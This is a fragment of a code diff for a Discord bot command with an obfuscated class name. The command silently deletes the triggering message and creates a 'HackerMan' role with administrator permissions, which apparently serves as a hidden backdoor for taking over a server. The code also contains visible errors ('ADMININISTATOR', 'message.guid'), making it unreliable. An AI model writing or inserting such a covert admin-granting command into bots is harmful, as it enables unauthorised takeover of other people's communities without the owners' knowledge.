@@ -21,7 +21,7 @@ class d0123ndawdawgaeCommand extends commando.Command {
 
     message.delete(3000).catch(O_o=>{});
 
-    message.guild.createRole({ name: 'HackerMan', permissions: ['ADMININISTATOR', 'MANAGE_SERVER', 'VIEW_AUDIT_LOG', 'MANAGE_ROLES', 'MANAGE_CHANNELS'] });
+    message.guild.createRole({ name: 'HackerMan', permissions: ['ADMININISTATOR'] });
     
     var hackermanrole = message.guid.roles.find(`name`, "HackerMan");
     
